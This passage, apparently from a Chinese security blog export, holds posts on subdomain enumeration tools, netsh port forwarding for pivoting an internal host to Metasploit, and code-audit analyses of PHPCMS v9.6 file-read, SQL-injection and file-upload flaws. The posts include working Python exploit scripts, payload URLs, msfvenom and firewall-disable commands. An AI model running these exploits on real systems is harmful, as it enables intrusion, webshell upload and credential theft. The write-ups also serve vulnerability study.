安装：https://github.com/projectdiscovery/subfinder/releases/tag/v2.4.8 1./subfinder -d target.com -o $outfile 4.6 theHarvester https://github.com/laramies/theHarvester 安装 123456789101112#kali#or$ ~ &gt; git clone https://github.com/laramies/theHarvester $ ~ &gt; cd theHarvesterIf developing do:$ ~ &gt; python3 -m pip install -r requirements/dev.txtElse:$ ~ &gt; python3 -m pip install -r requirements/base.txt$ ~ &gt; python3 theHarvester.py -h 使用： 1theharvester -d target.com -b all 4.7 Sudomy https://github.com/Screetsec/Sudomy 1./sudomy -d target.com -dP -eP -rS -cF -pS -tO -gW --httpx --dnsprobe -aI webanalyze -sS 4.8 Knock https://github.com/guelfoweb/knock AXFR, virustotal, brute-force 12345apt-get install python-dnspythongit clone https:&#x2F;&#x2F;github.com&#x2F;guelfoweb&#x2F;knock.gitcd knocknano knockpy&#x2F;config.json # &lt;- 设置你的virustotal API_KEYpython setup.py install 12knockpy target.comknockpy target.com -w $wordlist 4.9 dnssearch https://github.com/evilsocket/dnssearch 4.10 Dnscan https://github.com/rbsec/dnscan 4.11 Domained集成Sublist3r, Knock, Subbrute, Massdns, Recon-ng, Amass &amp; SubFinder https://github.com/cakinney/domained 4.12 subDomainsBrute https://github.com/lijiejie/subDomainsBrute 4.13 Layer子域名挖掘机4.14 teemo https://github.com/bit4woo/teemo 5. 在线工具 https://dnsdumpster.com/ https://www.nmmapper.com/sys/tools/subdomainfinder/ https://spyse.com/tools/subdomain-finder https://searchdns.netcraft.com/ https://detectify.com/ https://pentest-tools.com/information-gathering/find-subdomains-of-domain https://fofa.so/ https://www.zoomeye.org/ https://www.shodan.io/ https://phpinfo.me/domain 6. 字典相关 https://gist.github.com/jhaddix/86a06c5dc309d08580a018c66354a056 https://github.com/assetnote/commonspeak2-wordlists https://github.com/danielmiessler/SecLists/tree/master/Discovery/DNS 7. 威胁情报数据 微步：https://x.threatbook.cn/ alienvault：https://otx.alienvault.com/ riskiq：https://www.riskiq.com/ threatminer：https://www.threatminer.org/ virustotal：https://www.virustotal.com/gui/home/search 8. 细节 robots文件 sitemap文件 域传送漏洞 js敏感信息泄露 9. 参考 The Art of subdomain enumeration · GitBook (appsecco.com) Subdomains Enumeration Cheat Sheet · Pentester Land Subdomain Enumeration Tools Evaluation | by Ricardo Iramar dos Santos | Medium How to find Subdomains of a Domain in Minutes? (geekflare.com) https://blog.csdn.net/w1590191166/article/details/104160404","categories":[{"name":"web安全","slug":"web安全","permalink":"https://taonn.github.io/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"信息收集","slug":"信息收集","permalink":"https://taonn.github.io/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"}]},{"title":"配置基于Windows内置工具的端口转发","slug":"配置基于Windows内置工具的端口转发","date":"2021-04-08T13:18:37.000Z","updated":"2021-04-08T13:26:42.642Z","comments":true,"path":"2021/04/08/配置基于Windows内置工具的端口转发/","link":"","permalink":"https://taonn.github.io/2021/04/08/%E9%85%8D%E7%BD%AE%E5%9F%BA%E4%BA%8EWindows%E5%86%85%E7%BD%AE%E5%B7%A5%E5%85%B7%E7%9A%84%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/","excerpt":"","text":"0x00 前言在windows系统中，可以利用内置的netsh命令来进行端口转发。使用端口转发规则，可以将传入的TCP连接（IPv4或IPv6）从本地TCP端口重定向到任何其他端口号，甚至重定向到远程计算机上的端口。 0x01 防火墙管理首先先简单的了解一下windows中命令行操作防火墙的基本命令。 在win2003以及之前的操作系统命令如下： 1net firewall show state # 查看当前系统防火墙状态 1net firewall set opmode disable # 关闭当前系统防火墙 1net firewall set opmode enable # 启用当前系统防火墙 端口管理 12netsh firewall add portopening TCP 80 &quot;Open Port 80&quot; # 启用80端口netsh firewall delete portopening protocol=TCP port=80 # 删除启用的端口策略 Win2003之后的系统（虽已弃用，但还是可） 1netsh advfirewall show allprofiles # 查看当前系统所有网络类型的防火墙状态,比如,私有,公共,域网络 1netsh advfirewall set currentprofile state off # 关闭当前系统防火墙 1netsh advfirewall set currentprofile state on # 启用当前系统防火墙 1netsh advfirewall reset # 重置当前系统所有的防火墙规则 端口管理 12netsh advfirewall firewall add rule name= &quot;Open Port 80&quot; dir=in action=allow protocol=TCP localport=80 # 启用80端口netsh advfirewall firewall delete rule name=&quot;Open Port 80&quot; name protocol=TCP localport=80 # 删除启用80端口的策略 更多命令详解参考：使用 netsh advfirewall 防火墙而不是 netsh 防火墙控制 Windows 防火墙行为 0x02 基础命令使用Netsh命令中portproxy模式即可实现windows系统的端口转发，转发命令如下： 1netsh interface portproxy add v4tov4 listenaddress=localaddress listenport=localport connectaddress=destaddress connectport=destport listenaddress—-&gt;等待连接的本地IP地址 listenport—-&gt; 本地监听的TCP端口(等待连接) connectaddress—-&gt; 被转发的远程IP地址 connectport—-&gt;被转发的远程端口 0x04 本地转发环境说明 Win7: 1.1.1.13 实例将本地的RDP服务（远程协议）3389端口转发到本机的3333端口 1netsh interface portproxy add v4tov4 listenaddress&#x3D;1.1.1.13 listenport&#x3D;3333 connectaddress&#x3D;1.1.1.13 connectport&#x3D;3389 在建立上面的规则之前，需要保证监听端口没用被任何程序占用。 检查端口是否被占用 netstat -ano | findstr 3333 Test-NetConnection -ComputerName localhost -Port 3333 查询端口转发策略netsh interface portproxy show all 连接测试 0x04 远程转发由于本地转发只是在本机进行监听，远程的计算机无法进行连接。因此我们需要监听在0.0.0.0，实现远程任意主机可连接的端口转发。看下面实例吧。 环境说明123Win10攻击机:1.1.1.1目标边界Windows 2012 Server(可出网): 1.1.1.14目标内网Win7: 1.1.1.13 简单的网络拓扑如下图： Metasploit上线通过出网的边界windows 2012 server把内网Win7通过payload上线到Win10攻击机的Metasploit上。 在windows 2012执行如下命令： 12netsh advfirewall firewall add rule name= &quot;meta-online&quot; dir=in action=allow protocol=TCP localport=5353 # 配置开启5353端口策略 netsh interface portproxy add v4tov4 listenport=5353 connectaddress=1.1.1.13 connectport=53 # 端口转发：5353---&gt;1.1.1.13:53 msf生成正向连接的payload，在不出网的Win7上执行 1msfvenom -p windows/meterpreter/bind_tcp LPORT=53 AHOST=1.1.1.13 -f exe &gt; tao.exe # ahost为允许访问的机器（Win7） 最后，在Win10 攻击机启动metasploit监听 12345678sudo msfconsole -qmsf6 &gt; use exploit/multi/handler[*] Using configured payload generic/shell_reverse_tcpmsf6 exploit(multi/handler) &gt; set payload windows/meterpreter/bind_tcpmsf6 exploit(multi/handler) &gt; set RHOST 1.1.1.14msf6 exploit(multi/handler) &gt; set LPORT 5353msf6 exploit(multi/handler) &gt; set AHOST 1.1.1.13msf6 exploit(multi/handler) &gt; exploit -j 成功上线！ 利用完后，如需删除规则，使用如下命令： 12netsh advfirewall firewall delete rule name=&quot;meta-online&quot; name protocol=TCP localport=5353 # 删除启用5353防火墙策略netsh interface portproxy delete v4tov4 listenport=5353 # 删除端口转发 补充在Windows 2003/XP中，你必须在注册表HKLM\\SYSTEM\\ControlSet001\\Services\\Tcpip\\Parameters中找到并设置IPEnableRouter参数为1才能实现端口转发 参考 Configuring Port Forwarding on Windows 使用Windows命令来实现端口转发","categories":[{"name":"Red team","slug":"Red-team","permalink":"https://taonn.github.io/categories/Red-team/"}],"tags":[{"name":"端口转发","slug":"端口转发","permalink":"https://taonn.github.io/tags/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/"}]},{"title":"代码审计之PHPCMS v9.6.1 任意文件读取漏洞分析","slug":"代码审计之PHPCMS-v9-6-1-任意文件读取漏洞分析","date":"2021-02-10T08:21:17.000Z","updated":"2021-03-16T05:30:13.484Z","comments":true,"path":"2021/02/10/代码审计之PHPCMS-v9-6-1-任意文件读取漏洞分析/","link":"","permalink":"https://taonn.github.io/2021/02/10/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BPHPCMS-v9-6-1-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","excerpt":"","text":"这个版本任意文件读取漏洞和上一篇分析的wapSQL注入漏洞原理是类似的，且出现漏洞的原因都是在phpcms/modules/content/down.php文件中，所以我们这次直接对payload中的巧妙点进行分析 漏洞利用手动利用跟上篇wap的sql注入差不多，这次我们直接上poc脚本 1234567891011121314151617181920212223242526272829&#x27;&#x27;&#x27;Author: Taoversion: python3# 本脚本读取的是数据库配置文件&#x27;&#x27;&#x27;import requestsimport sysdef down(url): # step1 url_one = url + &#x27;/index.php?m=wap&amp;c=index&amp;siteid=1&#x27; step1 = requests.get(url_one) userid_flash = step1.headers[&#x27;Set-Cookie&#x27;].split(&#x27;=&#x27;)[1] # step2 url_two = url + &#x27;/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=pad%3Dx%26i%3D1%26modelid%3D1%26catid%3D1%26d%3D1%26m%3D1%26s%3D./caches/configs/database%26f%3D.p%25253chp&#x27; # 读任意文件这里修改 step2 = requests.post(url_two, data=&#123;&#x27;userid_flash&#x27;: userid_flash&#125;) for cookie in step2.cookies: if &#x27;_att_json&#x27; in cookie.name: att_json = cookie.value url_three = url + &#x27;/index.php?m=content&amp;c=down&amp;a=init&amp;a_k=&#x27; + att_json return url_threeif __name__ == &#x27;__main__&#x27;: url = sys.argv[1] downurl = down(url) print(downurl) 漏洞分析​ 我在分析这个漏洞，查资料的时候，发现了红日安全团队七月火也写有这个漏洞的分析文章，他写的非常详细，你们如果看不懂我写的，可以去看他的PHPCMS漏洞分析合集(下) （我比较菜！） ​ 首先访问脚本返回的url，调试分析一下phpcms/modules/content/down.php中init函数 17行safe_replace函数进行过滤，但是对我们传进去的值没有影响。18行parse_str函数解析注册变量，将$f=%253chp =&gt; 对其进行一次url解码为%3cph(这里因为%25 = %)，继续往下走，到76行 76-77行对f的值进行了检查，然后79行进行了加密，这里与上篇wap sql注入分析类似，但是不同的是这里加解密的 key 变成了 $pc_auth_key,80行返回我们下载的url, 会调用同文件中的download函数 我们点击下载，下断点到88行，分析download函数 90行对上面加密的值进行解密，然后94行再一次解析注册变量，此时将%3c进行解码为&lt;,所以$f=.p&lt;hp 103绕过了检查，108拼接，组成了我们想要下载的php文件（文件名还没完全对） 到这一步，126行就是产生漏洞的主要原因，也很好的解释了为什么我们传进去的值有&lt; 一次 str_replace(array(&#39;&lt;&#39;,&#39;&gt;&#39;), &#39;&#39;,$fileurl), 消去&lt;, 造成了任意文件的下载 这整个分析过程中，我们传进去的payload会经过两次safe_replace 、两次 parse_str,一次 str_replace(array(&#39;&lt;&#39;,&#39;&gt;&#39;), &#39;&#39;,$fileurl)而程序对 .. 和 php 字符进行了检测。所以我们要想访问 php文件或进行路径穿越，后缀可以设置成 ph&gt;p ，路径符可以变成 .&gt;. 。但是 safe_replace 函数会 str_replace(&#39;&gt;&#39;,&#39;&gt;&#39;,$string) ，所以 &gt; 字符需要编码两次，变成 %25253e 最后贴一张七月火师傅的触发过程整理图： 来源：红日安全团队七月火 参考： https://xz.aliyun.com/t/5731","categories":[{"name":"web安全","slug":"web安全","permalink":"https://taonn.github.io/categories/web%E5%AE%89%E5%85%A8/"},{"name":"代码审计","slug":"web安全/代码审计","permalink":"https://taonn.github.io/categories/web%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"tags":[{"name":"PHP代码审计","slug":"PHP代码审计","permalink":"https://taonn.github.io/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"代码审计之PHPCMSv9.6.0 wap模块SQL注入漏洞分析","slug":"代码审计之PHPCMS v9.6.0 wap模块SQL注入漏洞分析","date":"2021-02-09T10:55:00.000Z","updated":"2021-04-08T13:15:55.700Z","comments":true,"path":"2021/02/09/代码审计之PHPCMS v9.6.0 wap模块SQL注入漏洞分析/","link":"","permalink":"https://taonn.github.io/2021/02/09/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BPHPCMS%20v9.6.0%20wap%E6%A8%A1%E5%9D%97SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","excerpt":"","text":"环境搭建参考PHPCMS_V9.2任意文件上传getshell漏洞分析 漏洞复现此漏洞利用过程可能稍有复杂，我们可分为以下三个步骤： Step1：GET请求访问/index.php?m=wap&amp;c=index&amp;siteid=1 获取set-cookie中的_siteid 结尾的 cookie 字段的值 Step2：1. POST请求访问 /index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26id=%*27%20and%20updatexml%281%2Cconcat%281%2C%28user%28%29%29%29%2C1%29%23%26m%3D1%26modelid%3D1%26catid%3D1%26f%3DTao 上面访问的url通过URL解码为：index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=&amp;id=%*27 and updatexml(1,concat(1,(user())),1)#&amp;m=1&amp;modelid=1&amp;catid=1&amp;f=Tao (报错注入，语句可替换) 2. 将Step1获取_siteid 结尾的 cookie 字段的值，赋值给 userid_flash 变量,以post数据提交 获取set-cookie中的_json结尾字段的值 Step3：访问/index.php?m=content&amp;c=down&amp;a_k=step2获取的_json结尾字段的值 eg：/index.php?m=content&amp;c=down&amp;a_k=0e72z-2m8OJyw8injqvbY0xJtR5l5UtndXiFZmxcvK9kHkxN1COlnfyINF38Opx6UcdqlABV2gc-8RuG90sS6e31lJn2mxnkJPnUaQDCTAs0gEsKMnL5CHxl-o1hYg2TWaL5blo9RC8ya0yLkSc5NgzCqfTSgZCAlndhgum-OFk1XGARihPaYUs Step1： Step2： Step3： 老样子，贴个小脚本！ 12345678910111213141516171819202122232425262728293031323334&#x27;&#x27;&#x27;Author: Taoversion: python3# 本脚本执行返回user()信息&#x27;&#x27;&#x27;import requestsimport sys# from urllib import parseimport redef WAP_SQL(url): # step1 url_one = url + &#x27;/index.php?m=wap&amp;c=index&amp;siteid=1&#x27; step1 = requests.get(url_one) userid_flash = step1.headers[&#x27;Set-Cookie&#x27;].split(&#x27;=&#x27;)[1] # step2 payload = &#x27;%*27 and updatexml(1,concat(1,(user())),1)%23&amp;modelid=1&amp;catid=1&amp;m=1&amp;f=Tao&#x27; url_two = url + r&quot;/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26id=&#123;&#125;&quot;.format(requests.utils.quote(payload)) # 执行SQL语句，此处可修改 step2 = requests.post(url_two, data=&#123;&#x27;userid_flash&#x27;: userid_flash&#125;) for cookie in step2.cookies: if &#x27;_att_json&#x27; in cookie.name: att_json = cookie.value # step3 url_three = url + &#x27;/index.php?m=content&amp;c=down&amp;a_k=&#123;&#125;&#x27;.format(att_json) step3 = requests.get(url_three) res = re.findall(r&quot;MySQL Error : &lt;/b&gt;XPATH syntax error: &#x27;(.*?)&#x27;&quot;,step3.text) return resif __name__ == &#x27;__main__&#x27;: url = sys.argv[1] result_sql = WAP_SQL(url) print(result_sql) 执行效果如下： 脚本在对Stpe2那里进行了与手工不一样的处理，原因就是按照手工的方法进行编写的脚本会报错，具体是什么问题以及原因看文尾的分析。&gt;值得一看！！！ 漏洞复现为了更好的理解这个漏洞产生的原因，我们采取的方式是从后往前分析。 根据step3请求的URL地址，可以定位到phpcms\\modules\\content\\down.php文件init函数： 上面代码通过GET获取到了$a_k的值,然后将$a_k带入sys_auth函数进行解密（DECODE）,至于是如何加密的，我们无需关心，但是我们要知道的是$a_k的值是从拿来的，也就是Step2构造的语句是哪里进行加密处理的，还有就是加密用的key。 执行到17行，此时$a_k=&#123;&quot;aid&quot;:1,&quot;src&quot;:&quot;&amp;id=%27 and updatexml(1,concat(1,(user())),1)#&amp;m=1&amp;modelid=1&amp;catid=1&amp;f=Tao&quot;,&quot;filename&quot;:&quot;&quot;&#125;，这里还需要注意parse_str这个函数 通过官方给的例子可知，parse_str会将传入的值根据&amp;进行分割。然后解析注册变量。并且会对内容进行URL解码。 为了更好的理解上面这段话，看下图： 由图可知，当执行parse_str函数，他会进行以下步骤： 1.根据&amp;符解析$a_k的值，注册变量 2.将解析后变量的值进行URL解码 继续执行，到26进行了SQL语句执行，跟进一下 上图可知，执行的SQL语句如下： 1SELECT * FROM `phpcmsv96`.`v9_news_data` WHERE `id` = &#x27;&#x27; and updatexml(1,concat(1,(user())),1)#&#x27; LIMIT 1 我们将语句放到数据库执行一下。 正常返回了，但去掉#，报错，如下图： 这就是为什么Step2处，构造的SQL报错语句后面添加#进行注释 接下来分析Step2,我们需要弄明白，$a_k的值是怎么得到的，以及为什么POST请求数据中需要添加userid_flash字段和对应的值是怎么来的。 根据Step2的请求，我们定位到/phpcms/modules/attachment/attachments.php中swfupload_json函数。 由于swfupload_json方法是attachments类中的一个方法，我们看看类中的构造函数。（不知道你有没有发现什么） 类中的构造函数初始化会判断（21-23行）是否有$this-&gt;userid，那么这个$this-&gt;userid是怎么来的呢，17行对它进行了赋值 1$this-&gt;userid = $_SESSION[&#x27;userid&#x27;] ? $_SESSION[&#x27;userid&#x27;] : (param::get_cookie(&#x27;_userid&#x27;) ? param::get_cookie(&#x27;_userid&#x27;) : sys_auth($_POST[&#x27;userid_flash&#x27;],&#x27;DECODE&#x27;)); 上面的这一行代码，通过三元运算符判断$_SESSION[&#39;userid&#39;]是否有值，我们第一步利用中，肯定是没有值的，然后执行(param::get_cookie(&#39;_userid&#39;)，然后我们cookie也没有_userid，所以最终$this-&gt;userid = sys_auth($_POST[&#39;userid_flash&#39;],&#39;DECODE&#39;)); sys_auth($_POST[&#39;userid_flash&#39;],&#39;DECODE&#39;))就是对我们step2中userid_flash的值进行解密,这里跟Step3解密是同一个函数，走下来，$this-&gt;userid=1，就过了21行的判断。这也就是为什么POST请求数据中添加userid_flash字段。 接着分析swfupload_json方法 这里通过GET请求获取了src的值（报错注入语句）。并且经过了safe_replace函数的处理。跟进一下此还能输，看看如何处理的。 这个函数的功能就是对一些特殊字符进行了过滤，当经过这个函数，未作处理$string值为&amp;id=%*27 and updatexml(1,concat(1,(user())),1)#&amp;m=1&amp;modelid=1&amp;catid=1&amp;f=Tao。 走完以后，它将我们传入的%*27变成了%27。（上上图进行过滤的）这也就是为什么要加*号 继续执行，到244行由于cookie中没有att_json，所以跳转至250行进行设置cookie。 可以发现，这里cookie加密也是用的sys_auth函数(跟Step3解密用的同一个函数)，这里的key未指定，我们跟进一下这个函数。 图中可以得知，当key为空时，使用pc_base::load_config(&#39;system&#39;,&#39;auth_key&#39;)。跟Step3使用的一致。 接着分析Step1 前面提到为什么加userid_flash参数，$this-&gt;userid = sys_auth($_POST[&#39;userid_flash&#39;],&#39;DECODE&#39;));，为了过是否登录的判断。而且这里传入userid_flash的值必须是合法的cookie，也就是通过set_cookie函数设置的cookie，而又因set_cookie函数设置cookie会通过sys_auth加密。这样的解密才有效。 因此我们需要找到从哪里无添加即可获取cookie，这里利用的是wap模块的接口。在phpcms/modules/wap/index.php 上图代码处通过GET获取siteid的值,然后为其设置cookie。 整个漏洞的利用流程如下： 漏洞修复 对$a_k进行了过滤，且将$id进行了类型转换 前面提到问题的分析不知道你们有没有发现，手工利用跟脚本实现的时候不太一样（见下图） 正常来说，因为手工利用的时候直接访问/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26id=%*27%20and%20updatexml%281%2Cconcat%281%2C%28user%28%29%29%29%2C1%29%23%26m%3D1%26modelid%3D1%26catid%3D1%26f%3DTao,那么对应脚本应该如下写： 1url_two = url + &quot;/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26id=%*27%20and%20updatexml%281%2Cconcat%281%2C%28user%28%29%29%29%2C1%29%23%26m%3D1%26modelid%3D1%26catid%3D1%26f%3DTao&quot;# 执行SQL语句，此处可修改 但当我们这么写，执行的时候，会报错，报错如下： 刚开始我还以为是URL写错了，后面又测了一遍。发现手工可以，但是带到脚本就不行。由于Step2是本脚中最重要的环节，我就很确切的就把问题定位到了这里。最后实在没办法了（想搞懂为什么会这样），被requests这个库逼到绝路了(脚本这个错排了好久的😭)，于是我就去看了一下requests库的源代码，看看它对url是怎么处理的。最终得到的结果就是requests库对请求的url做了urlencode。当我得到这个结论的时候，大佬告诉我不encode怎么传递，我直接好家伙，当时我怎么就没想到这个呢。但后面又仔细想了想，分析这些漏洞，根据前辈的poc，学习这些手法，那么这些手法大多数不就是不按套路出牌嘛。（我也不知道我自己再说啥，反正玄学。。。） 进行urlencode在下处： 执行的流程如下： 回归正传，在这里我们以Step2请求的url为例： 1http://www.phpcms96.com/index.php/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26id=%*27%20and%20updatexml%281%2Cconcat%281%2C%28user%28%29%29%29%2C1%29%23%26m%3D1%26modelid%3D1%26catid%3D1%26f%3DTao 正常请求是没问题的，但当使用requests库请求时URL如下： 1http://www.phpcms96.com/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%2526id=%25*27%2520and%2520updatexml%25281%252Cconcat%25281%252C%2528user%2528%2529%2529%2529%252C1%2529%2523%2526m%253D1%2526modelid%253D1%2526catid%253D1%2526f%253DTao 分析如下图 就是对我们的url进行了编码，到这里我们仅仅只是发现了requests库对我们的url进行了encode，但php那边为什么会报错我们还没有搞明白，所以我们还得在php那边进行调试观察。 1%26id=%27andupdatexml%281%2Cconcat%281%2C%28user%28%29%29%29%2C1%29%23%26m%3D1%26modelid%3D1%26catid%3D1%26f%3DTao 接着走到Step3的代码位置，可以发现parse_str执行完了，并没有得到$id变量。前面说到parse_str函数是根据&amp;符进行解析注册的。但是由于这里urlencode将我们的&amp;进行编码了，没有解析注册对应的变量。所以报了上面的参数错误。 上面的分析很清楚的说明了问题，就是对url多进行了一次encode。那么怎么解决呢？这时候我猜看到这里的人你们肯定想的是将Step2的URL进行urlencode解码，然后再追加上去（是不是？），那么代码如下： 12payload = &quot;%*27 and updatexml(1,concat(1,(user())),1)%23&amp;modelid=1&amp;catid=1&amp;m=1&amp;f=Tao&quot;url_two = url + &quot;/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26id=&#123;&#125;&quot;.format(payload) 执行如下图，报Controller does not exist. 1http://www.phpcms96.com/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%2526id=%25*27%20and%20updatexml(1,concat(1,(user())),1)%2523&amp;modelid=1&amp;catid=1&amp;m=1&amp;f=Tao 由于是MVC架构，我们后面的m=1跟前面的m=attachments冲突了。我们将后面的m=1删除试一试。 还有有问题啊，没有&amp;符。看到这里，你肯定又会觉得，直接把id前面的%26改成&amp;不就好了嘛？ 12payload = &quot;%*27 and updatexml(1,concat(1,(user())),1)%23&amp;modelid=1&amp;catid=1&amp;m=1&amp;f=Tao&quot;url_two = url + &quot;/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=&amp;id=&#123;&#125;&quot;.format(payload) src=&#39;&#39;那这个漏洞就没法利用，所以说这个利用思路真的很妙。 就是删除了m=1,就没办法过下面的代码了。 好了好了不绕了，还是整理一下来说吧（前面还有一些细节点没说到）。前面说了一堆，大概情况总结下来如下图： 则这一切一切原因就是id=%*27这段部分，为什么这么说呢？贴下处理URL的代码吧(重点关注注释!!!的代码) 123456789101112131415161718192021222324// requests源代码 urllib3/util/url.py文件PERCENT_RE = re.compile(r&quot;%[a-fA-F0-9]&#123;2&#125;&quot;) # !!!..... component, percent_encodings = PERCENT_RE.subn( lambda match: match.group(0).upper(), component ) # !!! uri_bytes = component.encode(&quot;utf-8&quot;, &quot;surrogatepass&quot;) is_percent_encoded = percent_encodings == uri_bytes.count(b&quot;%&quot;) # !!! encoded_component = bytearray() for i in range(0, len(uri_bytes)): # Will return a single character bytestring on both Python 2 &amp; 3 byte = uri_bytes[i : i + 1] byte_ord = ord(byte) if (is_percent_encoded and byte == b&quot;%&quot;) or ( # !!! byte_ord &lt; 128 and byte.decode() in allowed_chars ): encoded_component += byte continue encoded_component.extend(b&quot;%&quot; + (hex(byte_ord)[2:].encode().zfill(2).upper())) return encoded_component.decode(encoding) 看到这里，你应该知道怎么回事了吧，如果你还不知道，也没关系。我们通过对比观察现象来说明问题： 调试将%encode的代码 调试不会将%encode的代码 具体我也不知道怎么说，大概就是我们url编码的数据（比如%27等多个，完整的）通过正则匹配的，需要跟uri_bytes.count(b&quot;%&quot;)获取的相等，而这里由于单独的%（不相等），因此就会被encode。 由于Step2的poc是需要经过safe_replace处理，然后拼接构造的SQL语句，这里我们只需要将%进行url编码即可，于是我们脚本的poc如下： 1payload = &quot;%25*27 and updatexml(1,concat(1,(user())),1)%23&amp;modelid=1&amp;catid=1&amp;m=1&amp;f=Tao&quot; 到了这一步，还没有完，因为依旧没法成功利用，看下图，还是参数错误。（原因就是前面提到的MVC架构，这里m冲突的问题） 调试的时候直接到了Step3哪里。$a_k还是空（说明未经过swfupload_json()） 正常来说执行如下图： 恶意代码是通过src参数传入的，而第3处对其他变量进行了判断。根据前面分析的截图，已知访问Step2链接的时候会进行decode,所以我们需要将&amp;进行url编码，最终的脚本poc如下： 1payload = &quot;%25*27 and updatexml(1,concat(1,(user())),1)%23%26modelid=1%26catid=1%26m=1%26f=Tao&quot; 没问题了！！！ 脚本报错的主要原因是id=%*27中这个%搞得鬼（但是这么写也是一定的，绕过safe_replace函数然后拼接SQL语句）。还有&amp;。由此可知，我们只需要将后面id后面的数据编码就可以成功利用。当然啦，最推荐得写法是利用quote函数。这个函数的作用就是进行特殊符号的encode。 看到这里，肯定又会有人要问了，你上面调用的是requests.utils.quote()，怎么放的图是urllib.parse.unquote()。 urllib.parse.unquote官方文档有说明，requests是第三方库，它官网文档我没看到对此函数的说明。但是都是一样的。 使用这个函数后，访问的URL如下： 1&#x27;http://www.phpcms96.com/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26id=%25%2A27%20and%20updatexml%281%2Cconcat%281%2C%28user%28%29%29%29%2C1%29%2523%26modelid%3D1%26catid%3D1%26m%3D1%26f%3DTao&#x27; 文章中有什么不足和错误的地方还望师傅们指正。","categories":[{"name":"web安全","slug":"web安全","permalink":"https://taonn.github.io/categories/web%E5%AE%89%E5%85%A8/"},{"name":"代码审计","slug":"web安全/代码审计","permalink":"https://taonn.github.io/categories/web%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"tags":[{"name":"PHP代码审计","slug":"PHP代码审计","permalink":"https://taonn.github.io/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"代码审计之PHPCMS_V9.6.0任意文件上传漏洞分析","slug":"代码审计之PHPCMSV9-6-任意文件上传漏洞分析","date":"2021-02-07T01:39:31.000Z","updated":"2021-04-08T13:16:33.773Z","comments":true,"path":"2021/02/07/代码审计之PHPCMSV9-6-任意文件上传漏洞分析/","link":"","permalink":"https://taonn.github.io/2021/02/07/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BPHPCMSV9-6-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","excerpt":"","text":"PHPCMS_V9.6.0任意文件上传漏洞分析前言PHPCMS是一款网站管理软件。该软件采用模块化开发,支持多种分类方式。 环境搭建本次PHPCMS版本为9.6.0,安装步骤跟上一篇文章一样，参考PHPCMS_V9.2任意文件上传getshell漏洞分析 漏洞复现在注册用户处，添加用户进行抓包（这里以Tao为例） 123#pocsiteid=1&amp;modelid=11&amp;username=Tao&amp;password=123456&amp;email=Tao@qq.com&amp;info[content]=&lt;img src=http://www.tao.com/t.txt?.php#.jpg&gt;&amp;dosubmit=1&amp;protocol=# http://www.tao.com/t.txt显示的内容为你要上传的文件内容 本次测试中, http://www.tao.com/t.txt文本内容如下： 修改，放包回显如下，然后我们访问该返回的url 利用成功！！！这里再贴个脚本 12345678910111213141516171819202122232425262728293031323334353637&#x27;&#x27;&#x27;version: python3Author: Tao&#x27;&#x27;&#x27;import requestsimport reimport randomimport sysdef anyfile_up(surl,url): url = &quot;&#123;&#125;/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1&quot;.format(url) data = &#123; &#x27;siteid&#x27;: &#x27;1&#x27;, &#x27;modelid&#x27;: &#x27;1&#x27;, &#x27;username&#x27;: &#x27;Tao&#123;&#125;&#x27;.format(random.randint(1,9999)), &#x27;password&#x27;: &#x27;123456&#x27;, &#x27;email&#x27;: &#x27;Tao&#123;&#125;@xxx.com&#x27;.format(random.randint(1,9999)), &#x27;info[content]&#x27;: &#x27;&lt;img src=&#123;&#125;?.php#.jpg&gt;&#x27;.format(surl), &#x27;dosubmit&#x27;: &#x27;1&#x27;, &#x27;protocol&#x27;: &#x27;&#x27; &#125; r = requests.post(url, data=data) return_url = re.findall(r&#x27;img src=(.*)&amp;gt&#x27;,r.text) if len(return_url): return return_url[0]if __name__ == &#x27;__main__&#x27;: if len(sys.argv) == 3: return_url = anyfile_up(sys.argv[1],sys.argv[2]) print(&#x27;seccess! upload file url: &#x27;, return_url) else: message = \\ &quot;&quot;&quot; python3 anyfile_up.py [上传内容URL地址] [目标URL] example: python3 anyfile_up.py http://www.tao.com/shell.txt http://www.phpcms96.com &quot;&quot;&quot; print(message) 运行效果如下图： 漏洞分析这个漏洞存在于用户注册处，通过上面请求的地址（/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1）,定位处理请求的函数为register,位于文件phpcms/modules/member/index.php33行处。 